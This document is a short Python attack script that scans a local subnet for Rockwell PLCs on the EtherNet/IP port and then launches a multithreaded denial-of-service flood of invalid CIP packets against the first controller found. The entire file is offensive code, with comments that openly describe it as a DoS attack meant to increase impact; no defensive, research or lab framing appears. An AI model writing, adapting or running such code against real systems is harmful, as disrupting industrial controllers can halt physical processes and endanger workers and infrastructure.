import socket
import time
from scapy.all import *
import threading

# Define standard EtherNet/IP port
ROCKWELL_PORT = 44818

# Function to scan network looking for Rockwell PLC
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network for Rockwell PLC...")
    ans, _ = sr(IP(dst=network_range)/UDP(dport=ROCKWELL_PORT), timeout=2, verbose=False)
    
    for snd, rcv in ans:
        print(f"[+] Potential Rockwell PLC found at {rcv.src}")
        return rcv.src  # Return first found PLC's IP
    
    print("[-] No Rockwell PLCs found on the network.")
    return None

# Function to flood the PLC with invalid EtherNet/IP packets
def dos_attack(ip):
    if not ip:
        print("[-] No valid PLC IP found. Exiting DoS attack.")
        return

    print(f"[*] Starting DoS attack on {ip}...")
    
    def flood():
        while True:
            try:
                # Create a socket and send an invalid CIP request to flood
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, ROCKWELL_PORT))
                sock.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")  # Invalid CIP Request
                time.sleep(0.01)  # Short delay to sustain attack
            except:
                pass
    
    # Launch multiple concurrent attacks to increase impact
    for _ in range(50):  # 50 threads sending invalid requests
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()

# Main execution flow
if __name__ == "__main__":
    plc_ip = find_plc_ip("192.168.1.0/24")  # Scan local network
    if plc_ip:
        dos_attack(plc_ip)  # Initiate DoS attack